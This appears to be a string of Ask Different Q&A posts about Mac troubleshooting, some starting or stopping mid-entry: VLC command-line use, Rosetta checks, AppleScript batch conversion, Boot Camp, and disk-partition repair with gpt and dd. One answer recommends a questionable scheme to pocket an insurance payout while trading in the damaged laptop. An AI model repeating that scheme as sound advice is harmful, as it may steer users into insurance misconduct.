Rather, it just displays the VLC playlist GUI window with a videoname.mp4 line, and I have to click on videoname.mp4 in this playlist GUI in order to start playing the video.\nIf I add --no-playlist-autostart and --play-and-exit command-line options, I get the same behavior.\nIf I run under Linux, I can use VLC to view the videoname.mp4 video by running the following command. No playlist GUI window pops up, and the video immediately starts playing:\n/usr/bin/vlc videoname.mp4\n\nIs there a way with the MacOS VLC program to immediately launch a video directly via the command line, without the VLC playlist GUI popping up at all? I want to launch videos from the command line under MacOS in the same manner that I can do it under Linux.\nThank you in advance for any suggestions.\n\nA: The following example works for me in Terminal with default setting in VLC and starts the video immediately:\nopen -a VLC '/path/to/filename.mp4'\n\n\nIn reference to the comment by HippoMan:\n\nI also often want to pass --sub-file /path/to/subtitles.srt , but the following does not work:  open -a VLC /path/to/file.mp4 --args --sub-file /path/to/subtitles.srt\n\nIf the .srt file is in the same directory as the .mp4 file and is named the same as it, it should get loaded automatically.

I have a brand new (one month old) MacBook Pro M1 running Big Sur with the latest updates. I have an Acer EB321HQU external monitor connected via DisplayPort to a j5Create USB-C hub, and I normally use it in clamshell mode. I have Battery preferences set to put the display to sleep when idle, not sleep the computer.\nI set the screen resolution to the highest available: 2560x1440. This works fine most of the time, but every now and then (3 times so far) when I wake it, the resolution will be extremely low, like 800x600. When I open the Display preferences, the maximum resolution listed (even when I use the Option key and click on \"Scaled\") will be 1920x1080.\nEventually I do all sorts of fiddling around and the high resolution settings reappear, but it seems really random. When this happened a few days ago, it switching between color profiles seemed to do it, but that didn't work today. This time, I put the display to sleep manually with Cmd-Control-Power, and when I woke it again the higher resolutions were back.\nAs far as I know, I hadn't done anything unusual before it went to sleep. It just seems to happen totally randomly.\nAnyone know what could be triggering this, and a more reliable way to get the high resolution back?\nIn another question about monitor resolutions, someone mentioned Display Maestro. I've just downloaded the trial version, so I'll give it a try if the problem happens again. But I'll still post this question now in case someone has more insight into the problem.\nEDIT: It happened again today, and Display Maestro didn't help. When I opened the laptop lid, it had spontaneously unchecked Mirror Displays mode. While in non-mirror mode I could see 2560x1440 on the external monitor's scaling options, but when I closed it they went away. I fiddle for a while with different modes, then put the display to sleep again and woke it up, and then I was able to mirror it in high resolution.\n\nA: I still don't know why this is happening, but I've found that I can now reliably fix it by simply manually putting the display back to sleep (with Control-Shift-Power) and then immediately waking it again.\nUPDATE:\nThat wasn't always quite as reliable as I thought, sometimes I had to do it twice.\nHowever, the problem has gone away completely since upgrading to Monterey.\n", "Q: Extracting calendar .ics file from iPad backup I used Finder on my Mac to back up an iPad (iPadOS 15) using USB-cable.

Is there a way to extract this soort of data from the local backup and without using iCloud services, Apple data request or third-party apps?\n\nA: My copy of iMazing allows you to export calendar entries as .xls, .csv or .ics, readily.\nI would guess, from that, calendar.app does not store calendar data in ICS natively. As ICS is a simple text file, and as such not a great way to store program data.\nBut like @IconDaemon indicated iExplorer (and iMazing) allow you to export calendar events without using iCloud.\n", "Q: Creating a \"virtual\" dir that wraps two (external) drives I was wondering if MacOS Mojave (the most recent version I can be on due to some very expensive 32 bit applications) has a way to set up a \"virtual\" dir, or even virtual drive, that combines two or more external drives and surfaces them as if they're one directory/drive.\nE.g. something that lets me say \"create a virtual dir/drive called audio data\" (that isn't JBOD/RAID0) and then specify two (or more) external SSDs such that the content of that dir/drive is the combined content of the solid state drives. If one has dirs Pro Logic data and Cubase data and the other has dirs Kontakt and Samples, then I'd like a single virtual dir/drive that shows:\n--- data\n |--- Cubase Data\n |--- Kontakt\n |--- Pro Logic Data\n |--- Samples\n\nWhen both SSD are connected, or if one of them's not connected, show\n--- data\n |--- Cubase Data\n |--- Pro Logic Data\n\nor\n--- data\n |--- Kontakt\n |--- Samples\n\ndepending on which drive's still accessible. Or a flatout empty dir/drive if nothing's connected.\nWith the explicit intent that if the SSDs that house dirs that some applications rely on aren't connected, then yes: those applications will throw errors. That's fine, and expected. I just want something that lets me surface a ton of data spread over multiple drives as a single dir/drive when they're all connected, with each SSD being \"just a drive\" that can also be connected to any random other computer that knows how to read/write the SSD's filesystem.\n\nA: To create a combined directory, run\nfind /path/to/volume1 /path/to/volume2 -type d -mindepth 1 -maxdepth 1 \\\n    -exec ln -s '{}' '/path/to/virtualfolder/' \\;\n\nThis will not take care of any duplicates, it will also not create the virtual folder (do this before running find).\n", "Q: Mutliple spaces/desktops: Disable switching to other spaces when opening an app? Not sure if I explained it well but you know when you have multiple spaces, you will still see the opened app on that other space on the app drawer on the bottom. I hate how it makes my desktop cluttered. There's a reason why I separated that space.\nI work multiple jobs so I assign different spaces for it. I want that space to act as its own desktop.

I am trying to run only native software. So I would like to be able to monitor whether Rosetta 2 is available or not.\nI am not asking if Rosetta 2 is running. I am asking if Rosetta 2 is present, is capable of running.\nI know I can sort on the Kind column of the process list seen in the Activity Monitor app to find a process currently running through Rosetta 2 or running natively (“Apple”). But I want to know if the Rosetta capability in general has been installed/activated in general on my Mac, even if no app is currently running that way.\n\nA: This simple one-liner will just print Yes or No:\n/usr/bin/pgrep -q oahd && echo Yes || echo No\n\nIf you're using Jamf, this code will create an Extension Attribute and populate it accordingly:\n#!/bin/sh\n#\n# reports status of rosetta install\n\nRESULT=$(/usr/bin/pgrep -q oahd && echo Yes || echo No)\n\necho \"<result>$RESULT</result>\"\n\n\nA: The Rosetta 2 installer seems to install at least three files:\n$ lsbom -f /Library/Apple/System/Library/Receipts/com.apple.pkg.RosettaUpdateAuto.bom\n./Library/Apple/usr/lib/libRosettaAot.dylib 100755  0/0 322368  1011814917\n./Library/Apple/usr/libexec/oah/libRosettaRuntime   100755  0/0 352176  1937385839\n./Library/Apple/usr/share/rosetta/rosetta   100644  0/0 64  1875722922\n\nSo testing for the existance of any of those (or for content in /usr/libexec/rosetta) should show you whether Rosetta actually got installed.\n\nA: Another option is to check if the oahd process is running;\npgrep oahd\n\nInternally rosetta is known as OAH.\nIf it returns a process id you know rosetta is installed.\nI use the following oneliner in my scripts;\nif [ $(/usr/bin/pgrep oahd >/dev/null 2>&1;echo $?) -eq 0 ]; then echo 'rosetta installed'; fi\n\n", "Q: Who repairs a two week MacBook Air cracked screen without Apple Care+? I opened the lid yesterday morning and the screen was unresponsive (black) and cracked on one corner (4cm). Apple says that the only alternative is to contract Apple Care+ (300€) and they will cover this damage. Should they repair this for free, being that new the laptop?\n\nA: Warranty is for manufacture failure. Insurance is for accidental damage. AppleCare+ is actually a bit of both.\nProving a screen broke 'all on its own' is going to be extremely tough. I'd check your regular household insurance coverage for 'accidental damage'.\n A bit of insider knowledge goes a long way here;) If you claim this on insurance, they will likely impose a lien on any future claim - i.e if they give you 2 grand now & you break another one, the first 1500 will be on you next time.\nSo, you take the 2 grand from the insurance - in your hand, or in the bank, not in vouchers & not in any \"we'll pay for it\" or \"give us your old one\" manner. You want the 2 grand and the broken computer in your hand.\nYou take this 2 grand & the broken computer to an Apple Store [not a 3rd party] & ask them if the broken one has any trade-in value. Also request that they safely destroy any data on the old one [this is why you take it to Apple, who are trustworthy in this].\nYou take the trade-in value, give them the rest of the money out of your 2 grand… & pocket the change [or keep it against that lien they imposed for if there's a next time.]\nThis is all actually legal & above board, but don't try it twice.\n", "Q: Should I disable secure boot on MacOS to install Windows? I have to disable secure boot on my Mac to install Windows on a external drive. I don't have any idea what boot, recovery mode, etc. is. According to the steps which I follow, I have to disable secure boot. After doing this, does my MacBook have a security problem?\n\nA: Here is the Startup Security Utility's dialog\n\nwhich shows and clearly describes the options and what they do.\nThe security problem with \"allow booting from external media\" is that your Mac can be booted by any external drive. Someone with physical access to your Mac could plug-in their own USB drive, boot it, and possibly read or copy files on your internal drive.\nThe use of FileVault mitigates against this, of course.\nAs pointed out, Allow/Disallow External Boot is different from Secure Boot settings, which control the status of the OSes that can boot.\nFull Security only allows OSes that have a valid signed security certificate from Apple can run. The risks from reducing this security mostly involve downloading an OS that you think is from Apple but which has been compromised in some way. Apple can 'turn off' security certificate (and they can also expire), which would prevent old OSes from running.\n\nA: You should not have to disable Secure Boot to install and operate Windows on an external drive. I have installed Windows 10 to both Thunderbolt 3 and USB drives on a 2018 Mac mini. The instructions for installing to a USB drive are given here\nThe Intel Mac Startup Security Utility settings for operating systems installed on external drives are given below.\n\n\n\n\n\nmacOS\nWindows\nLinux\n\n\n\n\nSecure boot\nFull, Medium or No Security\nFull, Medium or No Security\nNo Security\n\n\nExternal boot\nAllow\nAllow\nAllow\n\n\n\n\nYou should not need to turn off Secure Boot unless you desired an operation system other than macOS or Windows 10.\n\nSetting Secure Boot set No Security increases the possibility of your Mac booting nefarious software. For example, while running Windows on the external drive, bad software could instruct the firmware to execute the nefarious software on the next boot instead of macOS or Windows.\n\nAllowing external booting would permit the possibility someone could boot an installer or operating system from an external drive and access or erase your data. With external booting, you can still protect someone from reading your data by using encryption. However your Mac only has hardware support for encryption for macOS. Windows and other operating system may offer software only based encryption.\n", "Q: What if I give admin rights to a malicious installer? Some app installers outside the App Store require admin rights. If I give admin right to a malicious installer, can it do anything to my Mac, or will what it can do be limited by some protection technology?\n\nA: An installer's job is to install files. It can also run scripts that can delete files.\nApart from the OS system files themselves, an installer has free rein to install or delete files anywhere. You could make an installer that wasn't able to install or delete files, and while it would be very safe, it would also be very useless.\nGenerally, if the package file is from a reputable site, then I would not worry too much. You can always use the excellent app Pacifist, which can peek inside .pkg package files, and see what files are installed, and where, and what scripts it will run.\nOf course, you have a backup, which you can use to restore your computer's state to before the installer ran.\n", "Q: How often do AirTags beep when unattended? I understand that when AirTags are left unattended by their owner, they will beep at some point between 8-12 hours (chosen randomly), to discourage tracking people.\nI have my AirTags in various pieces of luggage, some of which I plan to keep in storage. Therefore it will trigger this initial beep.\nMy questions are:\n\n*\n\n*How often after that initial beep will it continue beeping?\n\n*What do these beeps sound like (Number of beeps, volume, etc)? Bonus points if I can simulate the beep to hear it exactly without needing to wait 8 hours.\n\nThe reason I ask is if it’s too frequent or too annoying, I’ll likely want to remove the AirTag so that it doesn’t disturb people at the storage facility.\n\nA: The AirTag only gives separation alerts (\"beeping\") when moved around. Having it in a piece of luggage in storage won't trigger this.\n", "Q: Batch convert Word .docx files to Pages I have a folder of almost 100 Word documents that I need to edit in Pages, but opening as .docx and then having to save as .pages manually isn't very convenient. Thus, I want to run a script/tool that will convert all of these Word docs to Pages format once and for all.\nSo far, I've tried these:\n\n*\n\n*Docxtor, which works perfectly but only converts 10 documents before presenting a paywall\n\n*iWork Converter, which doesn't do anything when you drag files to the window\n\n*Various Automator and AppleScript scripts, none of which have worked\n\nI'm not sure where to go from here. I'm not keen to purchase Docxtor (if I even could, the Purchase button on the website gives a Paddle error), but this may be the only solution.\nI'm running macOS 12 Monterey beta on an M1 MacBook Pro.\nIf anyone's got any suggestions, I'd be greatly appreciative! Thanks :)\nUpdate: I noticed that I misinterpreted iWork Converter, and it's actually for doing the opposite. Nonetheless, I'm still a little stuck here!\n\nA: I do not have macOS Monterey or an M1 to test on, however, the example AppleScript code, shown below, was tested in Script Editor under macOS Catalina with Language & Region settings in System Preferences set to English (US) — Primary and worked for me without issue1.\n\n*\n\n*1  Assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\nThe use of this script requires some initial setup for it to work.\n\n*\n\n*Place all .docx documents in their own folder so the target folder can be selected when the script runs. A list of all the .docx documents in the target folder will be created to loop through.\n\n*Open Pages and create a blank document, saving it in the folder you want the other documents saved to, and then minimize it. This is to allow Pages to say open while opening and closing the target documents, thus making the overall process take less time. No other Pages documents should be opened. When naming the document make it something that is not within the names of the other documents to be processed.\n\n*Open Script Editor and copy and paste the example AppleScript code into a new document, click the Compile button (a hammer icon) or press ⌘K to make sure there are not any compile related issues.\n\n*Click the Run button (right-pointing triangle icon) or press: ⌘R\nLet the script run uninterrupted until it's finished (or errors).\n\nExample AppleScript code:\nproperty theWordDocumentsList : missing value\nproperty |Pages| : name of ¬\n    application id \"com.apple.iWork.Pages\"\n\n--  # Choose the target folder containing\n--  # the docx documents for processing.    \n\ntell application id \"com.apple.finder\" to ¬\n    set theWordDocumentsList to ¬\n        (files of container (choose folder) ¬\n            whose name extension is \"docx\") ¬\n            as alias list\n\n--  # Loop through: theWordDocumentsList \n\nrepeat with thisDocument in theWordDocumentsList\n    \n    --  # Open the document.\n    \n    tell application id \"com.apple.iWork.Pages\"\n        activate\n        open thisDocument\n    end tell\n    \n    --  # Give a moment for 'Opening \"filename.docx\"…' to appear.\n    \n    delay 0.2\n    \n    tell application id \"com.apple.systemevents\"\n        \n        --  # Wait for 'Opening \"filename.docx\"…' to disappear.\n        \n        repeat while (role description of ¬\n            UI element 4 of window 1 of ¬\n            application process |Pages|) is \"button\"\n            delay 0.1\n        end repeat\n        \n        --  # Click 'Save As… ⌥⇧⌘S' to save as a Pages document.\n        \n        key code 1 using {shift down, option down, command down}\n        \n        --  # Wait for the 'Save' button to be available.\n        \n        repeat until exists ¬\n            button \"Save\" of sheet 1 of window 1 of ¬\n            application process |Pages|\n            delay 0.1\n        end repeat\n        \n        --  # Press the 'Save' button.\n        \n        key code 36 --  # enter key\n        \n        --  # Wait for the 'Save' button to to disappear.\n        \n        repeat while exists ¬\n            button \"Save\" of sheet 1 of window 1 of ¬\n            application process |Pages|\n            delay 0.1\n        end repeat\n        \n    end tell\n    \n    --  # Close the document.\n    \n    delay 0.2\n    tell application id \"com.apple.iWork.Pages\" to close document 1\n    delay 0.5\n    \nend repeat\n\n--  # Notify user processing if finished.\n\ntell current application to activate\ndisplay alert \"Processing finished!…\"\n\n\nNotes:\nAs the script uses UI Scripting it can be kludgy and prone to failure for a number of different reasons. For example, changes in the UI from one version of macOS to another or the target application. Trying to multi-task while it's running, which is a no-no for this type of script! The value of the delay commands outside of the repeat loops need adjusting.\nI tested with a 10 document sample set with the documents ranging from 1 to 7 pages and on my system, a 16\" 2019 MacBook Pro 2.3 GHz 8-Core Intel Core i9, and it took less than 40 seconds. This would equate to ~6.5 minutes for 100 documents. Obviously this will vary based on size of the documents and the speed of the system it's run on.\nYou can always test with, or run in several groups, with a smaller number of documents.\nAlthough it could be added, I did not include any error handling around existing documents if the script fails and needs to be restarted, so be aware that the .docx documents which have already been converted need to be manually removed before starting the script again.\n\n\n\nNote: The example AppleScript code is just that and sans any included error handling does not contain any additional error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors. Additionally, the use of the delay command may be necessary between events where appropriate, e.g. delay 0.5, with the value of the delay set appropriately.\n", "Q: OSX Automator - open app in application contents folder?

I previously enabled 2FA for my Apple ID and disabled it within the two-week window.  If I re-enable it, will I get another two weeks to disable it?\nThe reason I'm asking is that I want to enable Messages in iCloud to sync some messages between devices, but when that's finished I want to disable Messages in iCloud and download the synced set of messages to each device.  Then I want to turn 2FA off again.\nHere is my other related question about passcodes and 2FA:\nDoes Apple ID two-factor authentication force iOS device passcode / touch ID / face ID?\n\nA: I upgraded my apple ID to 2FA.  There is no option to disable it on appleid.apple.com.  Initially it was upgraded to two-step verification because I did not have a passcode enabled.  There was the option to disable two-step verification.  However, once I enabled a passcode and upgraded to 2FA, there was no longer an option to disable 2FA.\nIn the end I'm okay with this outcome because despite being stuck with 2FA, I still don't have to keep a passcode enabled, which was my primary concern.\n", "Q: Does Apple ID two-factor authentication force iOS device passcode / touch ID / face ID? If I have 2FA enabled for an Apple ID, am I required to use a passcode, touch ID, or face ID on iOS devices logged in to that ID?\nIn my particular case, I want to enable 2FA so that I can sync messages via Messages in iCloud.  There is a chance I might not be able to disable 2FA again since I already did that in the past, so I want to be clear about the consequences ahead of time.  Ultimately, I don't want a passcode at all times on every device.\n\nA: I went ahead and upgraded.  A passcode is not mandatory once 2FA is enabled.\nUpgrading to 2FA on appleid.apple.com with no passcode enabled actually upgrades to the weaker two-step verification.  There is an option to turn this off.  This two-step verification security can also be seen under Apple ID->Password & Security on iOS.\nOn that settings page, there is also a button to upgrade account security, which says that a passcode must be enabled when tapped.  Enabling a passcode does allow the upgrade to 2FA.

(ie what has to be changed to make them recognised as Apple Silicon not iOS) Some were built by other people and their build system is not Xcode so I need to report the problem upstream.\nThe kind=iOS ones include Emacs, Brave Browser, dosbox-x and DrRacket none of which run on iPhone/iPad and all are arm only executables\n\nA: A couple questions to answer here;\nThe Kind field list the kinds of applications that are on the computer. You roughly have them correct, the 32Bit apps are unsupported or no longer work. They are all older applications that were not updated to 64Bit and therefore no long run. (ie: unsupported) Logically, a Universal app is an app that will run on intel/Apple Silicon.\nThe apps that are listed as iOS are applications that are for the iOS. They have been built and compiled to run under that OS. If you want them to run under Apple Silicon, they need to be recompiled as a Multiplatform program.\n", "Q: Restore a deleted Note - no Deleted Notes folder? I put my phone in my pocket unlocked and when I took it out again it had opened Notes, deleted my growing task list and made a new empty note.\nI opened Notes on my Mac, and saw the note in question, yay! ...and then sync kicked in and deleted it.\nGuides suggest looking in the Deleted Notes folder, but I don't have one of those on any of my platforms.\nCan anyone offer a reason this might be happening?\n\nA: On Big Sur there is a folder called \"Recently Deleted\", however there seems to be a bug where the folder sometimes does not show on a device that has not deleted a note.\nEither look for the folder on your iPhone or on your Mac: Create a new note and delete it, see if that triggers the folder to show up.\n", "Q: Do Apple Card co-owners get their own titanium Apple Card?

I have a USB C-USB C iPad charging cable that I am using to charge my MacBook Pro. Only the cable is from the iPad, the power adapter is from the MacBook. Will the thinner wire adversely affect the charging speeds and the temperature of the power adapter?\nIf High School physics has not failed me, I remember that the radius of the wire does matter. But I am not sure if it matters enough in this case.\n\nA: If you have a genuine USB-C cable then by definition the cable must support at least 60W of power. This is plenty to charge a MacBook.\nThe temperature of the power adapter (or the cable itself) won't become a problem. The cable identifies itself to the charging device, so that the device \"knows\" whether the cable support 60W or an even higher wattage (such as 100W). Therefore there's no risk involved - the MacBook Pro won't try to draw 100W over a cable that only supports 60W.\nCharging speeds could be affected depending on your actual MacBook Pro model. Some models come with a 61W charger (13\" models), while others come with 87W chargers (15\" models) or 96W chargers (16\" models). If you've got a 60W cable and a 96W charger, charging will happen at a slower speed than if you had the ideal cable.\nIf your cable was made by Apple, you can identify the type of cable by looking at the printed text on it. You'll see that it says \"Designed by Apple in California [...]\" and then it lists a serial number. If that serial number begins with C4M or FL4, the cable supports 61W, whereas if it begins with DLC, CTC, FTL or G0J, then the cable supports up to 100W.\n", "Q: MacOS Big Sur - How to completely change admin password (including sudo commands) I just got a new Mac laptop at my job and the password they set it up with is very long and complex. It's very secure, but it's also a pain to type. I'm a developer so I have to use the password pretty regularly to change settings and run sudo commands.\nHow do I go about completely changing the password for the admin user?\nThere's only one user on the machine and I want to make sure that every single password request will accept this new password, including sudo commands in the terminal.\nThere are a few ways to change user, admin, and root passwords. So I want to make sure that I'm using the most thorough option to completely change the password.\n\nA: Using the system preference pane is the best way to change password since that will update associated keychain and FileVault items as needed. Other methods can cause keychain to fall out of sync.\n\n*\n\n*https://support.apple.com/guide/mac-help/change-the-login-password-on-mac-mchlp1550/mac\nIf you open help on macOS and search for change password, you should end up with the appropriate steps if online help isn’t handy for you.\n", "Q: Is there a way to have the Apple Mail font always look bigger? May be its me getting older, but it is really difficult to read the email in Apple Mail. The font size says 12 but it looks teeny-tiny to me. I need to bring it to at least 14-15 to avoid eye strain. But setting it to 15 would make my emails look like it came from kid (with the big font size.) Is there a way to solve this problem? Cmd + zooms in and makes the email font look bigger, but it works only on the current email. I cant keep pressing this key every time I open an email. Is there a way to have the emails zoomed in all the time? I am running Big Sur, if that helps. I can't use another email client, because customer needs me to use Apple Mail.\n\nA: Setting a size for your message font in Mail preferences should not affect the size of the font seen by recipients of your messages.  Normally the only way to do that is to set the font size for each outgoing individually in the New Message pane.\nSo just set it to 15 in Mail Preferences if you want.  Recipients should see whatever size they have set in their own preferences.\n\nA: Have you considered changing the scale of your desktop so that everything is a little bigger?  There would be no need to individually tweak app settings in that case.\nSystem Preferences > Display > Resolution: Scaled\nChoose one that you find more comfortable. At least give it a try and see what you think.\n", "Q: How to create a new Automator workflow via AppleScript The title really says it all: I want to use AppleScript to create a new Automator workflow. Apparently this can be done, but when looking at the ScriptEditor dictionary for Automator, I really don't know where to go from there.\nPlease note that I am not trying to create an Automator workflow to run some AppleScript (the workflow will actually be running a shell script).\n\nA: Automator is pretty goofy even on a good day.  The main things to look for when programmatically creating a workflow are an action's bundle identifier and its settings.  These can be found by looking at the action's Info.plist, or by using something like the following in the Script Editor:\ntell application \"Automator\"\n   set actionID to first item of (get id of Automator actions whose name is \"Run Shell Script\") -- or whatever\n   log result\n   log (get name of settings of Automator action id actionID)\nend tell\n\nFor the Run Shell Script action, those would be \"com.apple.RunShellScript\" and {\"inputMethod\", \"CheckedForUserDefaultShell\", \"source\", \"COMMAND_STRING\", \"shell\"}.\nThe settings are whatever is in the action's user interface, and vary depending on what the action does and the settings it exposes.  For the Run Shell Script action, the main ones would be \"COMMAND_STRING\", which is the script text in the text field, and \"inputMethod\", which is an index into the Pass input: menu item.\nAnother item to possibly keep track of is the index of the action in the workflow, but unless you are going to be moving around the actions, just adding to the end of the workflow will most likely be all you need to do.\nThere doesn't appear to be a property to set the type of document, but for a regular workflow you can accept the default with a keystroke, or just manually set the workflow type after the workflow is created behind Automator's choice sheet.\nAfter all that, a script to create an Automator workflow with a Run Shell Script action would be something like:\nset theScript to \"for f in \\\"$@\\\"\ndo\n   echo \\\"$f\\\"\ndone\" -- the shell script\n\ntell application \"Automator\"\n   set actionID to Automator action id \"com.apple.RunShellScript\"\n   tell (make new workflow)\n      add actionID to it -- add to the end of the workflow\n      tell last Automator action\n         set value of setting \"inputMethod\" to 1 -- arguments menu\n         set value of setting \"COMMAND_STRING\" to theScript\n      end tell\n   end tell\n   activate\n   # tell application \"System Events\" to keystroke return -- default workflow\nend tell\n\n", "Q: Why is a mac typically slow/laggy after upgrading the OS? I recently updated macOS to a new major version (Big Sur). I've read many claims that a newly upgraded macOS installation may be slow/laggy for 1–7 days because it needs to perform \"various maintenance routines\" and a user should wait through this period, after which time their computer will become efficient and stable again.\nI'm looking for clarification around the popular and folkloric notions of what macOS needs to do after an OS upgrade that make it inherently slow/laggy for a limited time.\nI see two categories of info, but I'm mainly interested in the first:\n\n*\n\n*Inherent reasons the OS needs to be slow (e.g. Siri/Spotlight reindexing)\n\n*Universally common reasons for slowness (e.g. iCloud synchronization issues or native Mac apps performing background updates)\n\nA: Right after an upgrade, system applications and services might need to do background work, which could mean that the user experiences the system as \"slower than usual\".\nAs you mention in your question, this can include Spotlight reindexing, but could also be for example Photos rescanning photos to create metadata.\nThere's no need to have to believe in any \"folklore\" though. You can easily determine whether or not your computer, after an upgrade, is engaged in such activities. Simply start Activity Monitor and look at the CPU time taken up by such services.\nAs you mention, these types of background operations completely within a fairly limited amount of time - and then you'll experience the performance level that you'll probably become accustomed to after a while. It might be the exact same performance level you saw right after upgrading, and it might be better. It's usually a quite individual experience.\n", "Q: Search shortcut and menu options not working in Activity Monitor Note: Why is search in Activity Monitor disabled? is a similar but different issue that doesn't address the one here (I tried switching views to and from Hierarchically.\nThe command ⌘-F shortcut doesn't seem to work in Activity Monitor.

My mid-2009 13\" unibody MacBook Pro died years ago. It's probably not worth fixing. I'm just curious if a dead CMOS/PRAM battery could have caused its demise?\niFixIt doesn't list any non-primary batteries in its online store or replacement guides for any unibody Macbook Pros.\nDid these models lack one altogether or was it just soldered to the logic board (In which case it'd be kind of like planned obsolescence) ?\n\nA: I don't know the precise details on this, per model, but the general rule of thumb is if the main battery is removable on a Macbook [Pro] then it has either a \"CMOS\" battery or a super capacitor.\nI'm pretty sure the Unibodies had the super capacitor, which assuming it still works is powered by the regular charging process. If it's failed, even after a good couple of main battery cycles on the charger, the primary symptom is probably that the date keeps resetting. It should still boot, though I saw mentioned in one site that it may not if it's cold.\nI'd check that before investigating further.\nI found this on iFixit - https://www.ifixit.com/Answers/View/394346/MacBook+Pro+13%22+Mid+2009+what+capacitor+I+need\n", "Q: How to set a multiple alert/reminder for the same calendar event?

I want this behavior to be de default one for any DMG I download from the web.\n\nA: Not all .dmg files open immediately to show their content in Finder [I think it depends entirely on whether they were open or not at creation/last Save], so if they don't, you need to have your Finder prefs set to show External disks.

Then upgrade that to Windows 10.\nYou will most likely have problems with your Apple hardware because the drivers come in through Boot Camp.  This may be fixable by extracting them from an newer distribution of Boot Camp.  I suggest you open a new question when you get there.\n\nA: You can’t install Windows 10 properly on a 2011 iMac via Boot Camp. This Apple Support page says one needs a 2012 iMac at the earliest.\n\nA: The Boot Camp Assistant can be used to installed 64 bit BIOS booting Windows 7 through Windows 8.1. Once installed, you should be able to upgrade to Windows 10 version 21H1. The Boot Camp Assistant is designed to use a Windows installation DVD to install Windows on your model Mac. The USB flash drive is suppose to just have the Boot Camp Support Software or Windows Support Software. The Windows drivers provided by Apple work best when Windows is installed to BIOS boot.\n\nAttempting an UEFI booting installation of Windows on a iMac12,1 generally results in either complete failure or partial lost of use of hardware.\n\nThe rest of this answer addresses how to do a clean install of Widows 10 version 21H1 without having to upgrade from a previous version.\nThere have been posts here at Ask Difference and elsewhere explaining how to install Windows 10 on Macs where the Boot Camp Assist is either not utilized or only partially utilized. One method, which was explicitly tested using a iMac12,1 and Windows 10 version 21H1, is given as the accepted answer to the Ask Different question \"How to install Windows 10 into a 2011 iMac without using the Boot Camp Assistant, an optical (DVD) drive or third party tools?\". This accepted answer requires the Mac to have firmware upgrades provided when High Sierra is first installed.\nThe basic steps are outlined below. See the link for more detailed steps.\n\n*\n\n*A partition is created for Windows on the internal drive.\n\n*Care is taken to insured that at least the partition where Windows is to reside is recorded in the legacy Master Boot Record (MBR) partition table. This is referred to as hybrid partitioning, which is a requirement when macOS and a BIOS booting Windows are installed.\n\n*The Windows files provide by Microsoft are copied to both the internal drive and an USB flash drive. The Windows files provided by Apple copied to the USB flash drive.\n\n*The Windows installer is UEFI booted from the USB flash drive. Once booted, commands are issued to make the internal drive BIOS bootable.\n\n*The Windows installer is BIOS booted from the internal drive. Windows 10 is then installed to the internal drive.\n\n*A temporary Administrator account is created so that Boot Camp can be installed along with other drivers. This account is then removed before the Mac shuts down.\n\nWhen finished installing, the Mac is left in the same state as any PC purchased with Windows preinstalled.\n", "Q: iMac 2017(27inch) kernel panics, and won't boot I'm currently having a issue with iMac 18,3.

Now I've updated to latest version(Big Sur 11.6), and it's working fine.\nNot sure what's caused the issue though, maybe the systems got corrupted somehow.Anyway, big thanks to @Jean_JD .\n\nA: May be removed and cleaned the RAM\n", "Q: How to enable Accessibility Keyboard for login screen from recovery mode My macbook's (running Catalina) internal keyboard is misbehaving after a water spill. It thinks the ctrl key is pressed. With an external usb keyboard i am able to get to the recovery mode, enter passwd and mount/access the file system as root. But the external keyboard doesn't work in the login screen (behaves the same way as the internal keyboard. Makes me wonder if the keyboard driver works differently in login vs recovery). NVRAM/PRAM and SMC resets are not helping either.\nFrom the command line is there a way to enable the on-screen accessibility keyboard ? Tried \"defaults read\" on a different machine and i do not see the key for \"Accessibility keyboard\". Or any other option to bypass the login screen from recovery mode ?\n\nA: Once booted to macOS Recovery, then from the Utilities menu, click Terminal.\nIn Terminal type the following, e.g., commands and press  enter after each:\n/usr/libexec/PlistBuddy -c \"Add :accessibilitySettings dict\" '/Volumes/Macintosh HD/Library/Preferences/com.apple.loginwindow.plist'\n/usr/libexec/PlistBuddy -c \"Add :accessibilitySettings:virtualKeyboardOnOff bool 1\" '/Volumes/Macintosh HD/Library/Preferences/com.apple.loginwindow.plist'\n\nThen type reboot and press: enter\n\nNotes:\nThe PlistBuddy commands above were tested from macOS Recovery on a system running macOS Catalina in which the Accessibility Keyboard had not previously been turned on under: System Preferences > Users & Groups > Login Options > Accessibility Options…\nIf the Accessibility Keyboard had previously been turned on and off again, then it can be changed using just:\n/usr/libexec/PlistBuddy -c \"Set :accessibilitySettings:virtualKeyboardOnOff 1\" '/Volumes/Macintosh HD/Library/Preferences/com.apple.loginwindow.plist'\n\nYou can check to see what already exists with the following command:\n/usr/libexec/PlistBuddy -c \"Print\" '/Volumes/Macintosh HD/Library/Preferences/com.apple.loginwindow.plist'\n\nIn the PlistBuddy command, if Macintosh HD is not the name of your normal Startup Disk, then change it as appropriate. If you are not sure or do not remember, then in Terminal type ls -1 /Volumes and press enter. It will be of the same name as the one with  - Data in it but use the one without it.\n", "Q: 2011 MBP , installed Ubuntu, erased partition, boot failures Result of internet recovery mode boot, attempt to remove disk0 and add.\n\nPermission denied :\n\nResult of sudo dd if=/dev/disk0s2 skip=64 count=3 bs=16 | hexdump -Cv and sudo dd if=/dev/disk0s2 skip=4 count=2 bs=16 | hexdump -Cv\n\nResult of sudo dd if=/dev/disk0s2 skip=64 count=3 bs=16 | hexdump -Cv\n\n\nResult of sudo dd if=/dev/disk0s2 skip=4 count=2 bs=16 | hexdump -Cv\n\n\nHexdump for disk0\n\nResult of Diskutil list, looks like something is amiss.\n\nWhen trying to chose the startup disk, there is no Disk , until yesterday , I could see one.\nError from First Aid done on APFS drive on Mac using Disk Utility\nApparently, this seems to be issue with corrupt boot partition/sector, but I am not sure how to fix. Please help. I have lot of data on this machine.\n@Tetsujin : I followed what was mentioned in the link, here is how far I could get .\nRan following commands\n\n*\n\n*diskutil list (output below in image)\n\n\n\n*gpt -r show disk0 (output below)\n\n\n\n*Since mine is APFS (High Sierra, 10.13.6), I followed appropriate commands.\ngpt remove -i 2 disk0\ngpt add -i 2 -b 409640 -s 878658168 -t 7C3457EF-0000-11AA-AA11-00306543ECAC  disk0\n\n\n\n*Then I ran diskutil verifyDisk disk0 and received the error in last exhibit. I am stuck, please help.\n\nSorry for images, not sure how to get better ones for all of you to see and advise.\n\nA: The output you posted indicates disk0s2 is using Core Storage. Below is the part of the image you posted showing this. This image also shows the size of the partition should be 0x68be84f000 bytes, 